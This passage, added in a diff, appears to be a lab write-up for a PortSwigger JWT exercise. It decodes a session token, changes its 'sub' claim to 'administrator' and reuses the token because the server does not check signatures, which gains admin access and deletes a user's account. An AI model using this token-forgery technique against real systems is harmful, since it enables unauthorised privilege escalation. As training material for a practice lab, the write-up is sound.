@@ -1,0 +1,23 @@
+What is done next is pretty simple:
+    We decode the JWT in the first file:
+        eyJraWQiOiJjNjdmMTc5Ny0wMGNkLTRhNjYtYWM0ZS0xZTlhNDkyYzY4ZTMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNDAwODQxNCwic3ViIjoid2llbmVyIn0.YDTBd6ZXMUWI8dVyOTrF54DYsiqkpBmpMDcM3Gx3fQa2w_W2QyveqkS1kOsD0kXZ00OgJa5Tv-vAaKlq0sFCS-UlX29VnJEbALTSGu8dex936E9rhEIQM3vGUucFDueKgkcHdld71AX5z5YCXbr2t0Yq3gZ0d1b2IkXxSyTkBpq-3i_yIKRQUGR0wt2WaIK7kq0umk8F1CY3ahhdp8eSE-jy6XU8vrYw_OJpcZW4YGTR1GpPNnRTSLhsMEFbwxe4gBtLf9H6DpOMP0UhZuIcDGkNmv4RWz6VTHNAkT8wnFpYiXNzDbG9mcb60fKlsekLrgMM60ezmvlQR_N2x4xMUQ
+        
+        turns into
+        
+        HEADERS:
+        {
+            "kid": "c67f1797-00cd-4a66-ac4e-1e9a492c68e3",
+            "alg": "RS256"
+        }
+        PAYLOAD:
+        {
+            "iss": "portswigger",
+            "exp": 1734008414,
+            "sub": "wiener"
+        }
+
+        if we tamper the "sub" field in the payload section, so that is replaced with the value "administrator", we get this encoded JWT:
+        
+        eyJraWQiOiJjNjdmMTc5Ny0wMGNkLTRhNjYtYWM0ZS0xZTlhNDkyYzY4ZTMiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczNDAwODQxNCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.BwoFogzG8AaF3G6wBPszUfbZzOQpotOHOOaW4GX1CS_ULl3qZiFtxjfto4h2Sd1f0nE9D5EybhyOZaDTQZH0bqZxw2oGgvzJJR6UOWf-iAG8LkfZYOkHYlMktcrKrLv-DxYm98HZSuV2J2XZ53n3fcyKMu5ibsjCegg8qPJYgpKhRcUsD_6dpQ9VObWTWLTyR2dvXJ7K9_lOcwhD8Sy-lXyKRnldlmSDgvSQ__rmp5K8MFxNTs-_d3EdsoE3PWyCEizd0pP-GayEojV9zMB8VdcoNrTlNEkD8ELkKwKrW0r7cmg7--yi28Ro2shM9V3ElpXG8D1CSHXz4OS4LIboBA
+
+        once replaced in the cookie storage, since the signature is present but is not verified, we indeed get access to the admin panel, where we can delete carlos' account 
